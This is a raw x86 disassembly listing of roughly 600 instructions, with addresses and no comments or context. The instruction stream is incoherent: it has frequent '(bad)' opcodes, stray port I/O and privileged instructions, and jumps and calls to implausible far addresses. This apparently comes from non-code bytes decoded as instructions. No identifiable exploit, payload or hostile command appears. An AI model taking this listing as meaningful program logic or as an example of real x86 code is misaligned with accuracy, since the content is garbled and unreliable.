  41a353:	or     dl,al
  41a355:	xor    esp,esi
  41a357:	test   DWORD PTR [eax+0x52],esp
  41a35a:	lods   eax,DWORD PTR ds:[esi]
  41a35b:	push   edi
  41a35c:	jae    0x41a336
  41a35e:	mov    al,ds:0x1c944e35
  41a363:	jns    0x41a37f
  41a365:	push   cs
  41a366:	ins    DWORD PTR es:[edi],dx
  41a367:	jbe    0x41a3a4
  41a369:	cmp    DWORD PTR [edi+esi*2+0xf68f1f3],0x18
  41a371:	jp     0x41a30e
  41a373:	xchg   ebp,eax
  41a374:	mov    ds:0xd1b054fd,al
  41a379:	and    bl,BYTE PTR [eax]
  41a37b:	fld    st(6)
  41a37d:	xchg   esi,eax
  41a37e:	sbb    edi,0x946cee4b
  41a384:	mov    al,ds:0x569c15ee
  41a389:	push   edx
  41a38a:	sbb    eax,0x37b13456
  41a38f:	mov    cs,WORD PTR [edx-0x7d]
  41a392:	dec    ecx
  41a393:	add    eax,ebx
  41a395:	adc    cl,BYTE PTR [ecx-0x7b16dab3]
  41a39b:	imul   eax,DWORD PTR [eax+0x2c968319],0x89984b55
  41a3a5:	das    
  41a3a6:	mov    eax,0x77c9fb1b
  41a3ab:	add    eax,0x2390b442
  41a3b0:	ret    
  41a3b1:	or     edi,ebx
  41a3b3:	adc    edx,edi
  41a3b5:	sbb    DWORD PTR [edx+0x45b55909],0xe1450fbd
  41a3bf:	inc    eax
  41a3c0:	out    dx,al
  41a3c1:	leave  
  41a3c2:	mov    ds:0x15e30aaf,eax
  41a3c7:	xor    DWORD PTR [ecx-0x45],edi
  41a3ca:	sub    eax,0x4e0974bd
  41a3cf:	sub    ebp,ecx
  41a3d1:	cdq    
  41a3d2:	mov    ebx,0x9fd9af2c
  41a3d7:	mov    dl,0x9f
  41a3d9:	mov    ah,0xd
  41a3db:	xchg   ecx,eax
  41a3dc:	mov    esp,0xeca72d1d
  41a3e1:	xor    DWORD PTR [edx],ebx
  41a3e3:	je     0x41a3a3
  41a3e5:	out    dx,eax
  41a3e6:	mov    cl,0x31
  41a3e8:	lahf   
  41a3e9:	stc    
  41a3ea:	idiv   BYTE PTR [esi]
  41a3ec:	ror    cl,cl
  41a3ee:	and    al,dh
  41a3f0:	mov    ds:0x2607ed85,al
  41a3f5:	pop    edx
  41a3f6:	mov    ebx,0x2caae62f
  41a3fb:	inc    esi
  41a3fc:	dec    esp
  41a3fd:	(bad)  
  41a3ff:	adc    al,0x4
  41a401:	cwde   
  41a402:	and    DWORD PTR ds:0xf07282a4,esi
  41a408:	aam    0x60
  41a40a:	outs   dx,DWORD PTR ds:[esi]
  41a40b:	(bad)
  41a40e:	enter  0x5fe5,0x5f
  41a412:	call   0x4a667a7d
  41a417:	dec    edi
  41a418:	mov    ecx,0x24fadb5d
  41a41d:	mov    ebp,0x55b79fa8
  41a422:	xchg   ecx,eax
  41a423:	out    0xd6,eax
  41a425:	push   ebx
  41a426:	cmp    al,0x8a
  41a428:	and    eax,ebx
  41a42a:	sbb    eax,0x701e3f47
  41a42f:	mov    ch,0x1e
  41a431:	mov    edi,0x307ddb52
  41a436:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a437:	cmp    DWORD PTR [esi-0xd6a5b47],ecx
  41a43d:	push   esp
  41a43e:	mov    DWORD PTR [ebp+0x20],eax
  41a441:	test   al,0x11
  41a443:	mov    al,ds:0x66a76fcd
  41a448:	fild   DWORD PTR [esi]
  41a44a:	mov    dl,dh
  41a44c:	popf   
  41a44d:	test   eax,0x15c8cc8b
  41a452:	pop    ecx
  41a453:	(bad)  
  41a454:	jmp    0x41a445
  41a456:	das    
  41a457:	sahf   
  41a458:	shr    DWORD PTR [ebx-0x14],0x79
  41a45c:	das    
  41a45d:	and    ebx,ecx
  41a45f:	inc    eax
  41a460:	in     al,dx
  41a461:	fxch   st(1)
  41a463:	arpl   cx,bp
  41a465:	xchg   esp,eax
  41a466:	jae    0x41a48a
  41a468:	sbb    eax,0xa97ca2df
  41a46d:	jmp    DWORD PTR [edi+0xa]
  41a470:	xchg   ecx,eax
  41a471:	jns    0x41a4a6
  41a473:	add    ah,ch
  41a475:	sbb    eax,0xdc5732bc
  41a47a:	ins    BYTE PTR es:[edi],dx
  41a47b:	add    eax,0x90415288
  41a480:	stc    
  41a481:	xor    al,0x38
  41a483:	mov    bh,0x1
  41a485:	sar    DWORD PTR [esp+ecx*8],1
  41a488:	das    
  41a489:	mov    edx,0x6621ad7b
  41a48e:	pop    edi
  41a48f:	(bad)  
  41a490:	cmp    al,0x31
  41a492:	call   0xc96e0b62
  41a497:	fnsave [edx-0x75]
  41a49a:	(bad)  
  41a49b:	jg     0x41a4c1
  41a49d:	xor    DWORD PTR [edx],0xdfdfdfd5
  41a4a3:	inc    edx
  41a4a4:	mov    esi,0xc8ae24f4
  41a4a9:	sbb    dl,dh
  41a4ab:	fcmovnb st,st(3)
  41a4ad:	xchg   BYTE PTR ds:0x364fd5e4,dl
  41a4b3:	and    ah,BYTE PTR ds:0xd9092f10
  41a4b9:	push   ebp
  41a4ba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a4bb:	adc    eax,0x52e44fc1
  41a4c0:	(bad)  
  41a4c1:	data16 mov ah,0x3d
  41a4c4:	icebp  
  41a4c5:	outs   dx,DWORD PTR ds:[esi]
  41a4c6:	pop    edx
  41a4c7:	iret   
  41a4c8:	call   0xe3d:0x73a3496c
  41a4cf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a4d0:	adc    ch,BYTE PTR [ecx-0x27]
  41a4d3:	pop    es
  41a4d4:	jns    0x41a4a8
  41a4d6:	lahf   
  41a4d7:	pop    ds
  41a4d8:	mov    ds:0x1fd63664,eax
  41a4dd:	sbb    DWORD PTR [edi+esi*2-0x7f89649f],0x4570db09
  41a4e8:	in     eax,0xcd
  41a4ea:	enter  0x1e7e,0xa8
  41a4ee:	xor    al,0x47
  41a4f0:	mov    ecx,0xe3629e50
  41a4f5:	test   BYTE PTR [edi-0x12],0xbb
  41a4f9:	clc    
  41a4fa:	jns    0x41a521
  41a4fc:	or     ah,BYTE PTR [eax-0x1eadc046]
  41a502:	jnp    0x41a583
  41a504:	xchg   eax,ecx
  41a506:	fs out 0x61,al
  41a509:	neg    BYTE PTR [edx]
  41a50b:	xor    al,0x7
  41a50d:	pop    ebp
  41a50e:	xor    esp,DWORD PTR ds:0xfcfa0b4b
  41a514:	das    
  41a515:	or     BYTE PTR [edx],dl
  41a517:	inc    edx
  41a518:	prefetchw BYTE PTR [esi+0x7b]
  41a51c:	fnstsw WORD PTR [esi-0x7a1cb57d]
  41a522:	adc    eax,0xb48c9c8d
  41a527:	clc    
  41a528:	aaa    
  41a529:	or     ch,BYTE PTR [ebp-0x62a8cce2]
  41a52f:	mov    DWORD PTR [ebx+0x1d9195d3],edx
  41a535:	lfs    edi,FWORD PTR [ebp+0x47]
  41a539:	push   ebp
  41a53a:	mov    eax,0xdb79cc2c
  41a53f:	cmp    eax,0xce340681
  41a544:	pop    DWORD PTR [eax]
  41a546:	int    0xeb
  41a548:	xchg   edi,eax
  41a549:	mov    ch,0x1
  41a54b:	jne    0x41a509
  41a54d:	jecxz  0x41a582
  41a54f:	mov    al,0x45
  41a551:	jb     0x41a596
  41a553:	pop    edi
  41a554:	and    ch,bl
  41a556:	and    BYTE PTR [esi+0x71],al
  41a559:	sbb    eax,esp
  41a55b:	mov    eax,DWORD PTR [edx+0x4b]
  41a55e:	mov    dl,0xf
  41a560:	mov    esp,esp
  41a562:	or     ebx,DWORD PTR [edi+0x77]
  41a565:	ret    0xf301
  41a568:	fldenv [eax-0x3d]
  41a56b:	iret   
  41a56c:	dec    ebx
  41a56d:	call   0xb241:0x3c58df57
  41a574:	push   cs
  41a575:	imul   ecx
  41a577:	sbb    al,0x86
  41a579:	bound  ebx,QWORD PTR [esi-0x2cac8918]
  41a57f:	or     al,0xb3
  41a581:	int    0xc
  41a583:	adc    BYTE PTR [eax],0xde
  41a586:	add    dh,BYTE PTR [ebp+0x23]
  41a589:	js     0x41a56f
  41a58b:	or     edx,DWORD PTR [edi+0x20ed06f7]
  41a591:	inc    ebx
  41a592:	add    eax,0xd386c649
  41a597:	lea    ecx,[ebx-0x15]
  41a59a:	jp     0x41a599
  41a59c:	jnp    0x41a5e9
  41a59e:	push   es
  41a59f:	call   0x5cd6:0xd54ebecb
  41a5a6:	loope  0x41a5c3
  41a5a8:	mov    ch,0xe5
  41a5aa:	outs   dx,BYTE PTR ds:[esi]
  41a5ab:	sbb    DWORD PTR [si-0x4],esi
  41a5af:	jnp    0x41a5a9
  41a5b1:	cwde   
  41a5b2:	das    
  41a5b3:	(bad)
  41a5b6:	or     al,0x8a
  41a5b8:	sub    edi,DWORD PTR [ebx-0x26c55b2f]
  41a5be:	adc    esp,ebx
  41a5c0:	xchg   edi,eax
  41a5c1:	popf   
  41a5c2:	inc    esp
  41a5c3:	daa    
  41a5c4:	and    al,BYTE PTR [edx+0x71]
  41a5c7:	mov    ds:0x78448bcb,al
  41a5cc:	(bad)  
  41a5cd:	in     al,0x32
  41a5cf:	(bad)  
  41a5d1:	mov    ch,0x3a
  41a5d3:	popf   
  41a5d4:	dec    ecx
  41a5d5:	push   edx
  41a5d6:	aam    0xaf
  41a5d8:	jmp    0x900:0x3451a9d3
  41a5df:	dec    ebx
  41a5e0:	int    0x97
  41a5e2:	int    0x54
  41a5e4:	sbb    BYTE PTR [eax+0x2c],ah
  41a5e7:	mov    esi,0x37469a82
  41a5ec:	push   ss
  41a5ed:	mov    bh,0x52
  41a5ef:	pusha  
  41a5f0:	pop    esi
  41a5f1:	mov    ch,0x2f
  41a5f3:	daa    
  41a5f4:	xor    eax,0x33cd5628
  41a5f9:	data16 cld 
  41a5fb:	inc    edi
  41a5fc:	inc    eax
  41a5fd:	cmp    bl,BYTE PTR [edx-0xdfc3c23]
  41a603:	push   esi
  41a604:	mov    ebx,0x46db5e1c
  41a609:	xor    DWORD PTR [ebp+ebx*2+0x1d814b64],edi
  41a610:	mov    cl,0x1f
  41a612:	xor    eax,0xa049c526
  41a617:	inc    esp
  41a618:	xchg   ebx,eax
  41a619:	xchg   esi,eax
  41a61a:	sub    esp,DWORD PTR [ebp+0x716f7f2a]
  41a620:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a621:	cdq    
  41a622:	pop    ecx
  41a623:	xor    cl,dl
  41a625:	or     bl,BYTE PTR [edx]
  41a627:	iret   
  41a628:	lock out 0x17,eax
  41a62b:	jne    0x41a605
  41a62d:	aam    0x1a
  41a62f:	bound  ebp,QWORD PTR [edi+0x65139c98]
  41a635:	jns    0x41a5f3
  41a637:	jbe    0x41a5d4
  41a639:	mov    ds,esi
  41a63b:	mul    edx
  41a63d:	out    dx,eax
  41a63e:	add    al,0x84
  41a640:	loop   0x41a6bf
  41a642:	stc    
  41a643:	and    DWORD PTR [ebx+0x2a],ebp
  41a646:	inc    ebx
  41a647:	fsub   DWORD PTR [edx]
  41a649:	das    
  41a64a:	xchg   esi,eax
  41a64b:	retf   0x6341
  41a64e:	push   es
  41a64f:	mov    BYTE PTR [esi],bl
  41a651:	push   ebx
  41a652:	push   eax
  41a653:	push   ds
  41a654:	retf   0x141
  41a657:	jg     0x41a62a
  41a659:	leave  
  41a65a:	nop
  41a65b:	cs int3 
  41a65d:	test   al,0x99
  41a65f:	fs mov dh,0xc2
  41a662:	jnp    0x41a67b
  41a664:	imul   ebp,DWORD PTR [eax+0x3a],0xffffffda
  41a668:	lahf   
  41a669:	mov    edx,0x121a8030
  41a66e:	inc    ecx
  41a66f:	pop    esp
  41a670:	fs push edx
  41a672:	inc    edx
  41a673:	cmp    dh,BYTE PTR [edi]
  41a675:	(bad)  
  41a676:	out    0x14,al
  41a678:	pop    es
  41a679:	or     eax,DWORD PTR [eax-0x2a8aec79]
  41a67f:	mov    esi,0xb62567bf
  41a684:	push   edi
  41a685:	aaa    
  41a686:	add    cl,BYTE PTR [ebp-0x5f]
  41a689:	push   esp
  41a68a:	sbb    dh,BYTE PTR [ebx-0x5]
  41a68d:	or     ch,BYTE PTR es:[esi-0x6ef3bf5b]
  41a694:	ds push edx
  41a696:	(bad)  
  41a698:	ret    0xb167
  41a69b:	push   0x7448fdb
  41a6a0:	or     ebp,0xa0fde754
  41a6a6:	cli    
  41a6a7:	mov    al,0xb2
  41a6a9:	ja     0x41a724
  41a6ab:	and    edi,DWORD PTR [ebx]
  41a6ad:	mov    ebp,0x2ea7513d
  41a6b2:	jmp    0xefca:0xe2d5f04e
  41a6b9:	xchg   ebp,eax
  41a6ba:	test   eax,0xa1649b7c
  41a6bf:	mov    ch,0x8
  41a6c1:	mov    bh,0x54
  41a6c3:	mov    al,0x74
  41a6c5:	jmp    FWORD PTR [ecx]
  41a6c7:	mov    ?,WORD PTR [eax+0x14]
  41a6ca:	fadd   st,st(1)
  41a6cc:	jnp    0x41a6cc
  41a6ce:	sbb    eax,0xee68bab2
  41a6d3:	inc    ecx
  41a6d4:	mov    BYTE PTR [edi],ch
  41a6d6:	push   0xfffffff5
  41a6d8:	call   0x6264df39
  41a6dd:	xor    BYTE PTR [esi+0x5b],cl
  41a6e0:	or     BYTE PTR ds:[esi+0x22],ah
  41a6e4:	sbb    al,0x4b
  41a6e6:	mov    bh,BYTE PTR [ebx+eax*8]
  41a6e9:	jecxz  0x41a6f0
  41a6eb:	push   es
  41a6ec:	loop   0x41a6d7
  41a6ee:	mov    ebx,0xe22ff958
  41a6f3:	xor    al,0x88
  41a6f5:	les    eax,FWORD PTR [edx+ebp*1-0x1d]
  41a6f9:	pop    ds
  41a6fa:	add    BYTE PTR [edx-0x3c],bh
  41a6fd:	jne    0x41a744
  41a6ff:	je     0x41a6ce
  41a701:	(bad)  
  41a702:	cmc    
  41a703:	(bad)  
  41a704:	push   0xfffffff6
  41a706:	int    0xc2
  41a708:	xor    al,0x72
  41a70a:	add    eax,0xaa9535b7
  41a70f:	mov    ch,0x5e
  41a711:	jne    0x41a786
  41a713:	out    dx,eax
  41a714:	je     0x41a720
  41a716:	push   ebx
  41a717:	mov    bh,cl
  41a719:	stc    
  41a71a:	inc    ecx
  41a71b:	mov    ebp,0xc3e99153
  41a720:	pop    ecx
  41a721:	jmp    0x41a770
  41a723:	fwait
  41a724:	pop    es
  41a725:	jl     0x41a734
  41a727:	sbb    al,0x14
  41a729:	div    ebp
  41a72b:	xor    eax,0xac724724
  41a730:	jno    0x41a7ad
  41a732:	(bad)  
  41a733:	mov    edx,0x6a2e895d
  41a738:	xor    bl,BYTE PTR [ecx+0x3]
  41a73b:	jb     0x41a6ef
  41a73d:	mov    ah,0x59
  41a73f:	pop    esi
  41a740:	imul   edx,DWORD PTR [ebx+edi*1],0x21
  41a744:	out    0x6f,al
  41a746:	inc    eax
  41a747:	pop    edi
  41a748:	fdivr  QWORD PTR [edx+0x2cb3545]
  41a74e:	xor    al,BYTE PTR [ecx]
  41a750:	push   ebp
  41a751:	jg     0x41a79b
  41a753:	dec    ecx
  41a754:	ror    DWORD PTR ds:0x65bd714,1
  41a75a:	(bad)
  41a75d:	test   DWORD PTR [ebp-0x54972ec2],ebp
  41a763:	xchg   dl,ch
  41a765:	inc    esi
  41a766:	xchg   esp,eax
  41a767:	and    eax,0xbdd39a40
  41a76c:	dec    ebp
  41a76d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a76e:	fs sub al,0x2
  41a771:	scas   al,BYTE PTR es:[edi]
  41a772:	pop    ds
  41a773:	xor    eax,ebp
  41a775:	inc    esi
  41a776:	and    al,0xef
  41a778:	out    0x94,eax
  41a77a:	or     bh,al
  41a77c:	mov    al,ds:0x112bf53e
  41a781:	fcmovnbe st,st(2)
  41a783:	lock ins BYTE PTR es:[edi],dx
  41a785:	lahf   
  41a786:	jno    0x41a7d4
  41a788:	aas    
  41a789:	dec    esp
  41a78a:	jnp    0x41a79c
  41a78c:	pop    ss
  41a78d:	fiadd  DWORD PTR [ecx]
  41a78f:	pop    esi
  41a790:	shl    DWORD PTR [ecx],0xa5
  41a793:	push   edi
  41a794:	sbb    BYTE PTR [ebx],ch
  41a796:	mov    al,0x3c
  41a798:	ret    0x4cbc
  41a79b:	or     DWORD PTR [ebp-0x2b],ecx
  41a79e:	out    dx,al
  41a79f:	in     eax,dx
  41a7a0:	cmp    eax,0xae776f80
  41a7a5:	scas   eax,DWORD PTR es:[edi]
  41a7a6:	xchg   ebp,eax
  41a7a7:	into   
  41a7a8:	add    eax,DWORD PTR [edx+0x4dd881a7]
  41a7ae:	push   esp
  41a7af:	sar    ecx,1
  41a7b1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a7b2:	jb     0x41a80b
  41a7b4:	pop    ebx
  41a7b5:	push   eax
  41a7b6:	or     esp,DWORD PTR [edi+0x59]
  41a7b9:	gs mov cl,0xed
  41a7bc:	mov    ch,0x3c
  41a7be:	xor    BYTE PTR [eax],ah
  41a7c0:	inc    ebp
  41a7c1:	add    eax,0x4220b34f
  41a7c6:	or     ebx,DWORD PTR [ebx]
  41a7c8:	mov    bh,0x29
  41a7ca:	add    bh,cl
  41a7cc:	sub    BYTE PTR ds:0x665f3e13,ch
  41a7d2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a7d3:	(bad)  
  41a7d5:	leave  
  41a7d6:	fidivr DWORD PTR [ecx+0x3c]
  41a7d9:	aaa    
  41a7da:	lock in eax,dx
  41a7dc:	jne    0x41a7f7
  41a7de:	sbb    ah,BYTE PTR [eax]
  41a7e0:	cwde   
  41a7e1:	push   0xd31f8833
  41a7e6:	push   edi
  41a7e7:	cmp    bh,BYTE PTR gs:[ebp-0x27b13169]
  41a7ee:	dec    ebp
  41a7ef:	add    al,0xe6
  41a7f1:	push   0xffffffd4
  41a7f3:	ss mov ecx,0xf47cf9d5
  41a7f9:	cmc    
  41a7fa:	push   eax
  41a7fb:	inc    edi
  41a7fc:	pop    ebx
  41a7fd:	adc    DWORD PTR [eax],edi
  41a7ff:	sub    DWORD PTR [esi-0x50],esi
  41a802:	out    dx,al
  41a803:	jae    0x41a845
  41a805:	shl    cl,1
  41a807:	js     0x41a842
  41a809:	into   
  41a80a:	add    DWORD PTR [ebx-0x3c],eax
  41a80d:	or     al,0xa0
  41a80f:	inc    edi
  41a810:	pushf  
  41a811:	push   eax
  41a812:	inc    esi
  41a813:	mov    eax,0x34669a4
  41a818:	sbb    eax,0x29fbf304
  41a81d:	add    al,0x2e
  41a81f:	mov    al,0xaa
  41a821:	push   cs
  41a822:	xor    BYTE PTR [edx+0x6d],ch
  41a825:	xor    bl,BYTE PTR [ecx+0x37]
  41a828:	cwde   
  41a829:	mov    ah,BYTE PTR [esi+ebx*8]
  41a82c:	inc    edx
  41a82d:	jo     0x41a7b1
  41a82f:	push   ds
  41a830:	lahf   
  41a831:	aaa    
  41a832:	mov    ch,0xbc
  41a834:	mov    ebx,0x85e90722
  41a839:	int    0x56
  41a83b:	jl     0x41a826
  41a83d:	das    
  41a83e:	jnp    0x41a8a6
  41a840:	add    BYTE PTR [esi-0x3],0x67
  41a844:	fld    QWORD PTR [edi-0x4e]
  41a847:	mov    bl,0xa2
  41a849:	mov    edx,0x4152a026
  41a84e:	clc    
  41a84f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a850:	ds iret 
  41a852:	xchg   esp,eax
  41a853:	cmp    bh,BYTE PTR [eax-0x44]
  41a856:	inc    ecx
  41a857:	out    0xdf,al
  41a859:	in     eax,dx
  41a85a:	clc    
  41a85b:	std    
  41a85c:	dec    ecx
  41a85d:	dec    ebx
  41a85e:	mov    ch,0xe2
  41a860:	sbb    DWORD PTR [esp+ecx*8],eax
  41a863:	dec    esi
  41a864:	xlat   BYTE PTR ds:[ebx]
  41a865:	mov    ah,BYTE PTR [eax+0x3c07591c]
  41a86b:	cmp    DWORD PTR [edx],0x62
  41a86e:	cmp    al,0x23
  41a870:	sub    bl,ch
  41a872:	lods   al,BYTE PTR ds:[esi]
  41a873:	jb     0x41a8a3
  41a875:	pop    ds
  41a876:	daa    
  41a877:	(bad)  
  41a878:	faddp  st(3),st
  41a87a:	es inc edi
  41a87c:	es ins BYTE PTR es:[edi],dx
  41a87e:	dec    esi
  41a87f:	stos   DWORD PTR es:[edi],eax
  41a880:	rol    BYTE PTR [eax],1
  41a882:	test   ah,ah
  41a884:	sub    BYTE PTR [eax-0x16276cca],ah
  41a88a:	fcmovnbe st,st(1)
  41a88c:	xchg   esi,eax
  41a88d:	inc    esi
  41a88e:	lods   eax,DWORD PTR ds:[esi]
  41a88f:	test   eax,0x42446149
  41a894:	mov    ds:0x8d69eb3a,al
  41a899:	xor    ah,BYTE PTR [ebx+ebx*1-0x65]
  41a89d:	test   BYTE PTR [edx-0x4d540c5c],al
  41a8a3:	ret    
  41a8a4:	pop    esi
  41a8a5:	or     eax,DWORD PTR [edi+0x45]
  41a8a8:	push   0x2c6f9ef7
  41a8ad:	fadd   DWORD PTR [esi]
  41a8af:	fisttp WORD PTR [edx]
  41a8b1:	mov    ebp,ebp
  41a8b3:	adc    al,0xb0
  41a8b6:	ret    
  41a8b7:	mov    esi,0xb31e2d44
  41a8bc:	push   ebx
  41a8bd:	pop    ds
  41a8be:	lock mov cl,0xc2
  41a8c1:	loopne 0x41a856
  41a8c3:	sub    edi,ecx
  41a8c5:	(bad)  
  41a8c7:	mov    edi,DWORD PTR [ebx-0x2ff1bb79]
  41a8cd:	cld    
  41a8ce:	mov    eax,ds:0xb411dc04
  41a8d3:	out    dx,al
  41a8d4:	leave  
  41a8d5:	dec    esi
  41a8d6:	add    al,0x71
  41a8d8:	adc    BYTE PTR [ebx],bh
  41a8da:	pop    ecx
  41a8db:	mov    esi,0xb9c7824e
  41a8e0:	push   0x37
  41a8e2:	(bad)  
  41a8e4:	es (bad) 
  41a8e6:	out    dx,eax
  41a8e7:	xor    DWORD PTR [edx-0x6badf290],edx
  41a8ed:	in     al,dx
  41a8ee:	(bad)  
  41a8f0:	jmp    0xe5a6:0x88cd03c4
  41a8f7:	adc    eax,0x5c22817f
  41a8fc:	sti    
  41a8fd:	jbe    0x41a948
  41a8ff:	or     BYTE PTR [ebp-0x7cae9ef8],ah
  41a905:	add    BYTE PTR [ecx+0x45ce9b42],ch
  41a90b:	sbb    ecx,DWORD PTR [esi+ecx*8-0x16ceeb7b]
  41a912:	push   eax
  41a913:	(bad)  
  41a914:	ret    0x2080
  41a917:	sbb    dl,BYTE PTR [ebx-0x4a]
  41a91a:	fucom  st(1)
  41a91c:	jbe    0x41a8b0
  41a91e:	ja     0x41a8cb
  41a920:	mov    edi,0xc0bfec9c
  41a925:	rol    BYTE PTR [edx+0x5f9ecf49],cl
  41a92b:	cmp    eax,0x36778406
  41a930:	pusha  
  41a931:	mov    eax,ds:0xcc1e7537
  41a936:	push   ebp
  41a937:	std    
  41a938:	stos   BYTE PTR es:[edi],al
  41a939:	cmp    ch,BYTE PTR [ecx]
  41a93b:	cmc    
  41a93c:	push   ecx
  41a93d:	out    dx,al
  41a93e:	mov    esi,DWORD PTR [ecx+0x4f]
  41a941:	mov    ch,0xca
  41a943:	xor    BYTE PTR [edi],cl
  41a945:	rcr    esi,1
  41a947:	pop    ebx
  41a948:	out    0xb3,eax
  41a94a:	sub    BYTE PTR [esi-0x52],dh
  41a94d:	ins    BYTE PTR es:[edi],dx
  41a94e:	adc    esp,ecx
  41a950:	pop    es
  41a951:	sbb    eax,0x92252a58
  41a956:	lods   eax,DWORD PTR ds:[esi]
  41a957:	push   ebx
  41a958:	bound  ecx,QWORD PTR [edx-0x40]
  41a95b:	push   ecx
  41a95c:	out    0x33,eax
  41a95e:	xchg   ecx,eax
  41a95f:	xor    ebp,DWORD PTR [esi]
  41a961:	inc    esi
  41a962:	ss leave 
  41a964:	cmp    DWORD PTR [edx+0x2b],ecx
  41a967:	out    0xc0,al
  41a969:	ror    DWORD PTR [edi+0x76f433f6],cl
  41a96f:	std    
  41a970:	gs das 
  41a972:	in     eax,dx
  41a973:	pop    ebx
  41a974:	adc    cl,ah
  41a976:	jle    0x41a8fb
  41a978:	loope  0x41a989
  41a97a:	fwait
  41a97b:	test   BYTE PTR [eax+0x65],0xe9
  41a97f:	mov    ecx,0x2d4e9531
  41a984:	add    eax,0x55832e9d
  41a989:	jmp    0x920a:0x8e527480
  41a990:	add    al,0x41
  41a992:	in     al,0x90
  41a994:	lds    edi,FWORD PTR [ebx-0x75]
  41a997:	sub    bh,bh
  41a999:	std    
  41a99a:	and    al,0x3d
  41a99c:	aas    
  41a99d:	(bad)  
  41a99e:	jae    0x41a9cc
  41a9a0:	dec    eax
  41a9a1:	and    eax,0x8fda115f
  41a9a6:	out    0x22,eax
  41a9a8:	mov    dl,0x5b
  41a9aa:	dec    eax
  41a9ab:	push   ss
  41a9ac:	mov    edx,DWORD PTR [esi]
  41a9ae:	add    al,0x48
  41a9b0:	jg     0x41a955
  41a9b2:	cmp    al,0xc7
  41a9b4:	xchg   ecx,eax
  41a9b5:	pop    ss
  41a9b6:	mov    dl,0xe
  41a9b8:	sbb    eax,0x211603b3
  41a9bd:	add    DWORD PTR [edi+0x1e],esi
  41a9c0:	daa    
  41a9c1:	outs   dx,BYTE PTR ds:[esi]
  41a9c2:	ds xchg dh,ah
  41a9c5:	mov    ecx,0x4a79fa4c
  41a9ca:	cmp    al,0x94
  41a9cc:	mov    ebx,0x2d414e95
  41a9d1:	sub    al,BYTE PTR [edi-0x49bdc329]
  41a9d7:	test   eax,0x910d7580
  41a9dc:	mov    cl,0x65
  41a9de:	repz cld 
  41a9e0:	mov    esi,0x1bf96b72
  41a9e5:	inc    ebp
  41a9e6:	jmp    0x487b:0xecac8ebb
  41a9ed:	mov    dh,0xe7
  41a9ef:	cli    
  41a9f0:	or     ch,BYTE PTR [ecx-0x521654c3]
  41a9f6:	ins    BYTE PTR es:[edi],dx
  41a9f7:	iret   
  41a9f8:	xor    al,0x6e
  41a9fa:	fidivr WORD PTR [edx]
  41a9fc:	addr16 sbb eax,0x4dbb2519
  41aa02:	xchg   esp,eax
  41aa03:	fadd   DWORD PTR [edx+0x40]
  41aa06:	gs sbb al,0xce
  41aa09:	ja     0x41a9ed
  41aa0b:	in     al,0x47
  41aa0d:	in     eax,dx
  41aa0e:	ja     0x41aa01
  41aa10:	icebp  
  41aa11:	and    DWORD PTR [edx+0x56],edi
  41aa14:	int    0x9d
  41aa16:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41aa17:	leave  
  41aa18:	je     0x41aa3f
  41aa1a:	fs pop esp
  41aa1c:	xchg   edi,eax
  41aa1d:	pop    ebp
  41aa1e:	mov    ds:0xda5515b8,eax
  41aa23:	pop    edx
  41aa24:	sub    BYTE PTR [ebp-0x40],bl
  41aa27:	ret    
  41aa28:	ins    BYTE PTR es:[edi],dx
  41aa29:	dec    esi
  41aa2a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41aa2b:	cld    
  41aa2c:	daa    
  41aa2d:	or     al,0xaa
  41aa2f:	ficom  DWORD PTR [edi-0x721d238f]
  41aa35:	(bad)  
  41aa36:	mov    dh,0x63
  41aa38:	xor    bl,ah
  41aa3a:	mul    BYTE PTR [ebx]
  41aa3c:	jmp    0x41aa80
  41aa3e:	aaa    
  41aa3f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41aa40:	gs sbb al,0x7c
  41aa43:	aaa    
  41aa44:	xor    al,0xb1
  41aa46:	(bad)  
  41aa47:	xlat   BYTE PTR ds:[ebx]
  41aa48:	repnz retf 
  41aa4a:	add    eax,0x79b92ad5
  41aa4f:	lahf   
  41aa50:	aas    
  41aa51:	push   ss
  41aa52:	shl    DWORD PTR [eiz*1-0x5a19685f],1
  41aa59:	push   ebx
  41aa5a:	or     BYTE PTR [ebx-0x2ca6148f],cl
  41aa60:	xor    ah,ah
  41aa62:	push   edx
  41aa63:	std    
  41aa64:	lahf   
  41aa65:	mov    ebx,0x83443dd6
  41aa6a:	sub    DWORD PTR [edi],edx
  41aa6c:	push   esi
  41aa6d:	(bad)  
  41aa6e:	sti    
  41aa6f:	jmp    0xf5d0eef6
  41aa74:	cmp    eax,0xc57397a0
  41aa79:	jae    0x41aac9
  41aa7b:	dec    edx
  41aa7c:	dec    edx
  41aa7d:	mov    ecx,0xd17e994c
  41aa82:	out    dx,al
  41aa83:	scas   al,BYTE PTR es:[edi]
  41aa84:	iret   
  41aa85:	cmc    
  41aa86:	mov    edi,esi
  41aa88:	out    0x30,al
  41aa8a:	xor    DWORD PTR [ecx+0x28d430f6],ebx
  41aa90:	adc    esp,DWORD PTR ds:0xf5a78b5e
  41aa96:	aam    0x40
  41aa98:	scas   eax,DWORD PTR es:[edi]
  41aa99:	icebp  
  41aa9a:	ds jl  0x41aa51
  41aa9d:	adc    eax,0x875f2159
  41aaa2:	shrd   ecx,ebp,0x59
  41aaa6:	int3   
  41aaa7:	cwde   
  41aaa8:	sbb    al,BYTE PTR [edi]
  41aaaa:	es clc 
  41aaac:	add    edx,ebx
  41aaae:	loop   0x41ab21
  41aab0:	mov    ebp,0xe34278c4
  41aab5:	push   esi
  41aab6:	cmp    eax,0x3a7e9c28
  41aabb:	test   eax,0x16ad8456
  41aac0:	push   edx
  41aac1:	mov    bh,0x43
  41aac3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41aac4:	dec    edi
  41aac5:	scas   al,BYTE PTR es:[edi]
  41aac6:	lea    ecx,[ecx+edx*8-0x52]
  41aaca:	or     DWORD PTR [ebx],edx
  41aacc:	adc    eax,0xbbdec21b
  41aad1:	mov    gs,WORD PTR [edx]
  41aad3:	hlt    
